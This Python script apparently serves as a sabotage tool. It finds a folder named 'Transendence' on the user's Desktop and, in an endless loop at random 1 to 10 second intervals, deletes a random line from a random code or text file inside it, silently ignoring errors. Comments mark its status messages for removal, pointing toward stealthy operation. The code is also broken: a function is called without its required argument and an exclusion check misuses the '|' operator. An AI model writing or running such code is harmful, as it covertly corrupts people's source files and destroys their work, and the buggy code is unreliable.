import os
import random
import time
import sys


TARGET_FOLDER_NAME = "Transendence"
SEARCH_ROOT = os.path.expanduser("~/Desktop")
FILE_EXTENSIONS = ['.py', '.js', '.html', '.css', '.txt', '.java', '.cpp', '.c', '.php']
EXCLUDED_FILES = ['play.sh', os.path.basename(__file__)]
SLEEP_INTERVAL = (1, 10)

def find_target_directory():
    for root, dirs, _ in os.walk(SEARCH_ROOT):
        if TARGET_FOLDER_NAME in dirs:
            return os.path.join(root, TARGET_FOLDER_NAME)
    return None

def get_target_files(directory):
    valid_extensions = ['.py', '.js', '.html', '.css', '.txt', '.java', '.cpp', '.c', '.php']
    all_files = []
    target_dir = find_target_directory()
    if not target_dir:
        print ("No target dir found")
        return []
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if file == os.path.basename(__file__) | file in EXCLUDED_FILES:
                continue
            if any(file.endswith(ext) for ext in valid_extensions):
                all_files.append(os.path.join(root, file))
    
    return all_files

def delete_random_line(filepath):
    try:
        with open(filepath, 'r+', encoding='utf-8') as f:
            lines = f.readlines()
        
        if not lines:
            return
        
        line_to_delete = random.randint(0, len(lines)-1)
        del lines[line_to_delete]
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.writelines(lines)
        
        print(f"Deleted line {line_to_delete+1} from {os.path.basename(filepath)}") #delete
    
    except Exception:
        pass

def main():
    current_dir = os.getcwd()
    print(f"WARNING: Script active in [{current_dir}]. Monitoring files...") #delete
    
    while True:
        time.sleep(random.randint(1, 10))
        
        target_files = get_target_files()
        if target_files:
            selected_file = random.choice(target_files)
            delete_random_line(selected_file)

if __name__ == "__main__":
    main()